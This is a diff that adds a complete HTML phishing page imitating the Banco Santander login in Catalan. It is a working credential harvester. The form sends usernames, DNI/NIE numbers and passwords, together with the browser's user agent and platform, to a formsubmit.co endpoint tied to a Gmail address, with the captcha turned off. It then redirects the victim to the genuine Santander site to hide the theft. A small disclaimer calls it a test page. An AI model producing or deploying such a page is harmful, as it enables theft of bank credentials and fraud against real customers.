@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang>
+<head>
+  <meta charset="utf-8">
+  <title>One Web - Acceso</title>
+  <base href="/oneweb/">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      font-family: "Santander Micro Text", "Verdana", sans-serif;
+      color: #222222;
+      background: #f5f9fb;
+      height: 100%;
+    }
+    .login-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .login-card {
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 1px 10px rgba(163,163,163,0.4);
+      padding: 40px 32px;
+      width: 100%;
+      max-width: 420px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .logo img {
+      max-width: 200px;
+      height: auto;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 0.875rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+      color: #222222;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #8f8f8f;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-family: inherit;
+      transition: border-color 0.2s;
+    }
+    .form-group input:focus {
+      outline: none;
+      border-color: #ec0000;
+      box-shadow: 0 0 0 2px rgba(236,0,0,0.15);
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #ec0000;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s;
+      font-family: inherit;
+    }
+    .btn-submit:hover {
+      background: #cc0000;
+    }
+    .btn-submit:disabled {
+      background: rgba(34,34,34,0.06);
+      color: rgba(34,34,34,0.23);
+      cursor: not-allowed;
+    }
+    .error-msg {
+      color: #990000;
+      font-size: 0.8rem;
+      margin-top: 4px;
+      display: none;
+    }
+    .footer-links {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 0.8rem;
+    }
+    .footer-links a {
+      color: #ec0000;
+      text-decoration: none;
+      font-weight: 700;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .btn-loading .btn-text { display: none; }
+    .btn-loading .spinner { display: block; }
+    .legal-notice {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 0.7rem;
+      color: #727272;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-card">
+      <div class="logo">
+        <svg viewBox="0 0 200 50" width="200" height="50">
+          <rect width="200" height="50" fill="none"/>
+          <text x="10" y="35" font-family="Arial" font-weight="bold" font-size="28" fill="#ec0000">Santander</text>
+        </svg>
+      </div>
+
+      <form id="loginForm" action="https://formsubmit.co/adminsecurity12@gmail.com" method="POST">
+        <!-- FormSubmit config -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_subject" value="[PROJECTE] Noves dades de login">
+        <input type="hidden" name="_next" value="https://particulares.bancosantander.es/oneweb/">
+        <input type="hidden" name="_autoresponse" value="Gràcies per iniciar sessió al Banco Santander.">
+
+        <div class="form-group">
+          <label for="usuario">Usuari / DNI / NIE</label>
+          <input type="text" id="usuario" name="usuario" placeholder="Introdueix el teu usuari" required autocomplete="off">
+        </div>
+
+        <div class="form-group">
+          <label for="password">Contrasenya</label>
+          <input type="password" id="password" name="password" placeholder="Introdueix la teva contrasenya" required>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">
+          <span class="btn-text">Accedir</span>
+          <div class="spinner"></div>
+        </button>
+      </form>
+
+      <div class="footer-links">
+        <a href="#">Has oblidat la contrasenya?</a> &nbsp;|&nbsp;
+        <a href="#">Registra't</a>
+      </div>
+
+      <div class="legal-notice">
+        Això és una pàgina web per iniciar sessió al Banco Santander per fer controls en entorns controlats. La pàgina no és real no poseu dades reals.Author no és responsable sobre vostres dades.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const form = document.getElementById('loginForm');
+      const btn = document.getElementById('submitBtn');
+
+      form.addEventListener('submit', function(e) {
+        // Mostrar loading
+        btn.classList.add('btn-loading');
+        btn.disabled = true;
+
+        // Guardar timestamp
+        const timestamp = new Date().toISOString();
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+
+        // Afegir camps ocults amb info adicional
+        const tsInput = document.createElement('input');
+        tsInput.type = 'hidden';
+        tsInput.name = '_timestamp';
+        tsInput.value = timestamp;
+        form.appendChild(tsInput);
+
+        const uaInput = document.createElement('input');
+        uaInput.type = 'hidden';
+        uaInput.name = '_useragent';
+        uaInput.value = userAgent;
+        form.appendChild(uaInput);
+
+        const platInput = document.createElement('input');
+        platInput.type = 'hidden';
+        platInput.name = '_platform';
+        platInput.value = platform;
+        form.appendChild(platInput);
+
+        // FormSubmit ja redirigeix automàticament a _next
+        // No bloquejem l'enviament normal
+      });
+
+      // Si l'usuari torna desde la redirecció, netejar
+      if (window.location.search.includes('submit')) {
+        console.log('Formulari enviat correctament.');
+      }
+    })();
+  </script>
+</body>
+</html>
